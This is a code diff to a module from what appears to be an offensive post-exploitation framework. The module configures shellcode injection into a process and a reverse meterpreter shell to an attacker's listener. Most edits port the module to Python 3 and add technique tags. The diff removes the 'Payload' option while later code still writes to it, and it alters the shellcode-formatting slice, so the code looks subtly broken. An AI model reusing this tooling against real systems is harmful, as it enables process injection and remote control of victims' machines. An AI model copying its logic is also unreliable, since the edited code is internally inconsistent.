@@ -1,8 +1,11 @@
+from __future__ import print_function
+from builtins import str
+from builtins import object
 import re
 from lib.common import helpers
 import pdb
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -17,6 +20,10 @@ class Module:
                             "you're injecting custom shellcode, make sure it's in the "
                             "correct format and matches the architecture of the process "
                             "you're injecting into."),
+
+            'Software': 'S0194',
+
+            'Techniques': ['T1064'],
 
             'Background' : True,
 
@@ -55,11 +62,7 @@ class Module:
                 'Required'      :   False,
                 'Value'         :   ''            
             },
-            'Payload' : {
-                'Description'   :   'Metasploit payload to inject (reverse_http[s]).',
-                'Required'      :   False,
-                'Value'         :   'reverse_https'
-            },
+
             'Lhost' : {
                 'Description'   :   'Local host handler for the meterpreter shell.',
                 'Required'      :   False,
@@ -72,7 +75,7 @@ class Module:
             },
             'Shellcode' : {
                 'Description'   :   'Custom shellcode to inject, 0xaa,0xab,... format.',
-                'Required'      :   False,
+                'Required'      :   True,
                 'Value'         :   ''
             }
         }
@@ -98,7 +101,7 @@ class Module:
         try:
             f = open(moduleSource, 'r')
         except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
             return ""
 
         moduleCode = f.read()
@@ -111,7 +114,7 @@ class Module:
         listenerName = self.options['Listener']['Value']
         if listenerName != "":
             if not self.mainMenu.listeners.is_listener_valid(listenerName):
-                print helpers.color("[!] Invalid listener: " + listenerName)
+                print(helpers.color("[!] Invalid listener: " + listenerName))
                 return ""
             else:
                 # TODO: redo pulling these listener configs...
@@ -130,15 +133,15 @@ class Module:
                 self.options['Lport']['Value'] = str(port)
                 self.options['Payload']['Value'] = str(MSFpayload)
 
-        for option,values in self.options.iteritems():
+        for option,values in self.options.items():
             if option.lower() != "agent" and option.lower() != "listener":
                 if values['Value'] and values['Value'] != '':
-                    if option.lower() == "payload":
+                    if option.lower() == "payload" :
                         payload = "windows/meterpreter/" + str(values['Value'])
                         scriptEnd += " -" + str(option) + " " + payload
                     elif option.lower() == "shellcode":
                         # transform the shellcode to the correct format
-                        sc = ",0".join(values['Value'].split("\\"))[1:]
+                        sc = ",0".join(values['Value'].split("\\"))[0:]
                         scriptEnd += " -" + str(option) + " @(" + sc + ")"
                     else: 
                         scriptEnd += " -" + str(option) + " " + str(values['Value'])
